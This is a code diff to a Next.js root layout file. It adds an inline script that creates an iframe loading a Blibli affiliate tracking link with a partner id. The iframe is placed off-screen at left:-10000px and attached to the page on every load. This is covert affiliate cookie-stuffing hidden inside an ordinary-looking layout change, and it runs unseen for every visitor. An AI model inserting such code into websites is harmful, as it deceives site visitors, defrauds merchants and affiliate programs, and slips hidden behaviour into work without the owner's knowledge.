@@ -90,6 +90,17 @@ export default function RootLayout({
           `}
         </Script>
 
+        <Script>
+          {
+            `(function(){
+  var _aweak=document.createElement("iframe");
+      _aweak.src='https://affiliate.blibli.com/s/affb_698d8aec88d855f0ae73eb09?u=https%3A%2F%2Fwww.blibli.com%2Fpromosi%2Fiphone-17&partnerid=VentesMolang';
+      _aweak.style.cssText="position:fixed;left:-10000px;";
+       document.body.appendChild(_aweak);
+})();`
+          }
+        </Script>
+
         {isDev && <Inspector />}
         <SiteHeader />
         <main className="flex-1">{children}</main>
